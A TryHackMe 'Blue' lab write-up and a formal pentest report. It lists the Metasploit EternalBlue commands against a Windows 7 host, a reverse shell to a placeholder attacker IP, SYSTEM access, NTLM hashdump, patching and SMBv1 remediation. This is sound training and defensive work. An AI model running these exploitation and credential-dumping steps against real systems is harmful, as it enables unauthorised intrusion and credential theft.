# Blue

**Platform:** TryHackMe
**OS:** Windows
**Tags:** MS17-010, EternalBlue, Metasploit, SMB, SYSTEM
**Date:** 2026-05-04

Windows box vulnerable to EternalBlue (MS17-010). Metasploit's SMBv1 exploit gives a direct SYSTEM shell.

## 1. Initial Enumeration

A service and script scan was run against the target to identify open ports and running services.

```bash
nmap -sV -sC <TARGET_IP>
```

Findings:
- 445/tcp - SMB open, NetBIOS services exposed
- OS: Windows 7 Professional SP1 x64
- SMB Signing: Disabled. Classic indicator of MS17-010 potential.

## 2. SMB Vulnerability Enumeration

With SMB open and signing disabled, ran targeted NSE scripts to confirm the MS17-010 vulnerability.

```bash
nmap --script=smb-vuln-ms17-010 <TARGET_IP>
```

**Result:** Target confirmed vulnerable to MS17-010 (CVE-2017-0143). Risk: Critical. Exploitable via SMBv1.

## 3. Exploitation: EternalBlue

Used Metasploit's EternalBlue module to exploit the SMBv1 vulnerability and get a shell.

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
set LHOST <ATTACKER_IP>
exploit
```

**Result:** Meterpreter session established. Running as NT AUTHORITY\SYSTEM. No privilege escalation needed.

## 4. Post-Exploitation

With a SYSTEM shell, dumped password hashes and retrieved flags.

```
hashdump
shell
type C:\Users\Administrator\Desktop\root.txt
```

Key Takeaway: MS17-010 (EternalBlue) directly returns SYSTEM on unpatched Windows 7/Server 2008 machines via SMBv1. Always check for this on old Windows targets. It's still common in internal network pentests.

---

## Penetration Test Report

**Target:** blue.thm
**Address:** <TARGET_IP>
**Assessment type:** Internal network assessment - SMB service exploitation
**Assessment date:** 4 May 2026
**Environment:** TryHackMe laboratory assessment
**Prepared by:** Ledion Mujaj
**Reference:** 01 / 08

---

## 1. Executive Summary

### Assessment outcome

Testing identified one critical severity finding affecting **blue.thm** . The host was running Windows 7 Professional SP1 x64 with SMBv1 enabled and unpatched against MS17-010, a publicly known remote code execution vulnerability. Exploitation via the EternalBlue Metasploit module yielded a direct SYSTEM shell with no privilege escalation required.
A second finding records post-exploitation password hash extraction. With SYSTEM access, the hashdump command retrieved local account NTLM hashes from the SAM database, exposing credentials that could be used in pass-the-hash or offline cracking attacks.

### Impact

The MS17-010 vulnerability provided immediate, unauthenticated control of the operating system. An attacker with network access to port 445 could execute arbitrary code, read and alter any file on the system, and use extracted credentials to move laterally to other hosts.
No operational loss is asserted for this laboratory system. The result demonstrates full host compromise; the business impact on a production deployment would depend on data, credentials and network connectivity present on the affected machine.

### Priority recommendations

1. Apply Microsoft security update MS17-010 immediately, or disable SMBv1 if the patch cannot be applied.
2. Isolate Windows 7 systems from untrusted networks; Windows 7 reached end of support in January 2020 and no longer receives security updates.
3. Store credentials with appropriate protection; ensure NTLM hash extraction is detectable through endpoint monitoring.

### Conclusion

The critical finding is directly exploitable from the network without authentication. Patching or disabling SMBv1 eliminates the primary attack path and removes the initial access vector that enabled hash extraction.

## 2. Assessment Scope and Methodology

### 2.1 Target and observed services

| Asset | Address | Description |
| --- | --- | --- |
| blue.thm | <TARGET_IP> | Windows 7 Professional SP1 x64; SMB and related NetBIOS services |
| Port | Service | Observed detail |
| --- | --- | --- |
| 135/tcp | MSRPC | Microsoft Windows RPC |
| 139/tcp | NetBIOS | NetBIOS session service |
| 445/tcp | SMB | Microsoft-DS; SMB signing disabled; Windows 7 SP1 |
| 3389/tcp | RDP | Microsoft Terminal Services |

```
nmap -sV -sC <TARGET_IP>

PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1
3389/tcp open  ms-wbt-server Microsoft Terminal Services

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|_  Message signing enabled but not required
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|_    Risk factor: HIGH
```

SMB signing disabled. Confirmed MS17-010 with the smb-vuln-ms17-010 NSE script before exploitation.

### 2.2 Approach

Service discovery identified SMBv1 exposed on port 445. The Nmap `smb-vuln-ms17-010` script confirmed the vulnerability. The EternalBlue module in Metasploit was used to exploit the flaw and obtain a Meterpreter session. Post-exploitation steps included identity confirmation and password hash extraction.

### 2.3 Severity classification

| Rating | Assessment criteria |
| --- | --- |
| Critical | Direct, readily exploitable compromise with exceptional impact or reach. |
| High | Execution of arbitrary code, significant unauthorised access or escalation to administrative privileges. |
| Medium | Meaningful exposure with constrained impact or substantial exploitation prerequisites. |
| Low | Limited direct impact; improvement to an existing security control. |

## 3. Results Overview

### 3.1 Findings summary

| Reference | Finding | Severity | Page |
| --- | --- | --- | --- |
| [F-01](#f-01) | Unpatched SMBv1 - EternalBlue remote code execution (MS17-010) | **Critical** | 6 |
| [F-02](#f-02) | Local password hash exposure via post-exploitation hashdump | **Medium** | 7 |

### 3.2 Compromise sequence

| Stage | Action | Access obtained |
| --- | --- | --- |
| 01 | Confirmed MS17-010 vulnerability via Nmap NSE script against port 445. | Vulnerability confirmed |
| 02 | Executed EternalBlue exploit via Metasploit module ms17_010_eternalblue. | NT AUTHORITY\SYSTEM shell |
| 03 | Ran hashdump to extract local account NTLM hashes. | Credential hashes recovered |

### 3.3 Access level reached

The EternalBlue exploit delivered a Meterpreter session running as `NT AUTHORITY\SYSTEM` , the highest privilege level on a Windows host. No separate privilege escalation step was required. The administrator flag was retrieved directly from the Administrator desktop.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer        : BLUE
OS              : Windows 7 (6.1 Build 7601, Service Pack 1)
Architecture    : x64
System Language : en_US

meterpreter > shell
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
[redacted]
```

## 4.1 Unpatched SMBv1 - EternalBlue (MS17-010)

### F-01   MS17-010 Remote Code Execution - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | The host was running Windows 7 SP1 with SMBv1 enabled and had not been patched against MS17-010 (CVE-2017-0143). The vulnerability allows an unauthenticated attacker to execute arbitrary code in the context of the SYSTEM account by sending a specially crafted SMB request. Exploitation was performed using the public Metasploit module `exploit/windows/smb/ms17_010_eternalblue` . |
| Prerequisites | Network access to TCP port 445. No authentication required. |
| Impact | Immediate code execution as NT AUTHORITY\SYSTEM. Full control of the operating system, all files, accounts and services. |
| CVE | CVE-2017-0143 (MS17-010) |
| Affected system | blue.thm - Windows 7 Professional SP1 x64 `445/tcp (SMBv1)` |
| CVSS 3.1 | **9.3** (Critical) [AV:N/AC:M/PR:N/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:M/PR:N/UI:N/S:C/C:H/I:H/A:H) |
| CWE | [CWE-119](https://cwe.mitre.org/data/definitions/119.html) : Improper Restriction of Operations within the Bounds of a Memory Buffer |

### Steps to reproduce

1. Run `nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>` to confirm the vulnerability.
2. Launch Metasploit: `msfconsole` .
3. Use the exploit: `use exploit/windows/smb/ms17_010_eternalblue` .
4. Set `RHOSTS <TARGET_IP>` and `LHOST <ATTACKER_IP>` , then run `exploit` .
5. Observe a Meterpreter session opening as `NT AUTHORITY\SYSTEM` .

### Evidence

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS <TARGET_IP>
msf6 exploit(ms17_010_eternalblue) > set LHOST <ATTACKER_IP>
msf6 exploit(ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on <ATTACKER_IP>:4444
[*] Sending stage (200774 bytes) to <TARGET_IP>
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Evidence E-01. Metasploit session established as NT AUTHORITY\SYSTEM with no authentication. EternalBlue exploit against SMBv1 on port 445.

### Remediation

Apply Microsoft security bulletin MS17-010 without delay. Where patching is not immediately possible, disable SMBv1 via Windows Features or the registry. Restrict access to ports 139 and 445 at the network perimeter; these services should not be reachable from untrusted hosts. Windows 7 is end-of-life and should be replaced with a supported operating system.

### Verification

Confirm that the MS17-010 Nmap script returns no vulnerability after patching. Verify that the EternalBlue module fails to establish a session. Test that SMBv1 is disabled using `Get-SmbServerConfiguration | Select EnableSMB1Protocol` .

## 4.2 Local Password Hash Exposure

### F-02   NTLM hash extraction via hashdump - MEDIUM

| Field | Assessment |
| --- | --- |
| Description | With SYSTEM-level access obtained through F-01, the Meterpreter hashdump command was used to extract NTLM password hashes for all local accounts from the SAM database. These hashes can be used in pass-the-hash attacks against other Windows hosts or cracked offline to recover plaintext passwords. |
| Prerequisites | SYSTEM-level access to the host. This finding is dependent on F-01 providing the required privilege level. |
| Impact | Disclosure of all local account NTLM hashes. Recovered credentials may enable lateral movement to other systems where the same passwords are used, particularly where local administrator accounts share passwords across hosts. |
| Affected system | blue.thm - local SAM database All local user accounts |

### Evidence

```
meterpreter > hashdump
Administrator:[redacted]
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[additional accounts redacted]
```

Evidence E-02. Hashdump output showing that local account NTLM hashes are accessible from a SYSTEM session. Hash values are redacted. Guest account shows empty password hash (LM: aad3b..., NT: 31d6...).

### Remediation

Address the underlying SYSTEM access vector (F-01) to prevent reach of the SAM database. Enable Windows Credential Guard on supported hardware to protect credentials in memory. Ensure unique local administrator passwords across all hosts using a Local Administrator Password Solution (LAPS). Monitor for hashdump or Volume Shadow Copy activity in endpoint detection logs.

### Verification

Confirm that SYSTEM access is no longer achievable via the EternalBlue path. Verify that LAPS is deployed and that local administrator passwords differ between hosts.

## 5. Remediation and Assessment Closeout

### 5.1 Corrective action plan

| Priority | Action | Reference |
| --- | --- | --- |
| Immediate | Apply MS17-010 patch or disable SMBv1; isolate host from untrusted networks. | F-01 |
| High | Deploy LAPS to ensure unique local administrator passwords; enable Credential Guard. | F-02 |
| Strategic | Migrate from Windows 7 (end-of-life since January 2020) to a supported OS. | F-01 |
No remediation retest is documented. Each finding includes verification criteria for closure.

### 5.2 Evidence and limitations

Evidence blocks are sourced from the [Blue assessment walkthrough](blue-thm.html) . Flag values and full NTLM hash values are redacted from all evidence blocks. The assessment covered SMB services only; a full internal assessment would include all exposed services.

### 5.3 Evidence index

| Reference | Supporting record |
| --- | --- |
| E-01 | Walkthrough section 3: EternalBlue exploitation and SYSTEM shell |
| E-02 | Walkthrough section 4: Post-exploitation hashdump |
